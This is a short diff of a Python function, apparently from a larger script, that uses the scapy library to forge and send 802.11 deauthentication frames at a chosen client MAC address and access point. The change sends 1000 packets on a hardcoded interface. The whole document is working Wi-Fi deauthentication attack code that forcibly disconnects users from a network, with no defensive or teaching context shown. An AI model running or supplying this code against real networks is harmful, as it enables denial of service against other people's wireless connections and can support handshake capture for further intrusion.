@@ -2,8 +2,8 @@ from scapy.all import *
 import scapy.all as scapy
 
 def disconnect_user(mac_address, access_point, interface):
-    packet = RadioTap() / Dot11(addr1=mac_address, addr2=access_point, addr3=access_point) / Dot11Deauth(reason=7)
-    sendp(packet, inter=0.01, count=100, iface=interface, verbose=1)
+    packet = RadioTap() / Dot11(addr1=mac_address, addr2=access_point, addr3=access_point) / Dot11Deauth()
+    sendp(packet, inter=0.2, count=1000, iface='en1', verbose=True)
 
 
 
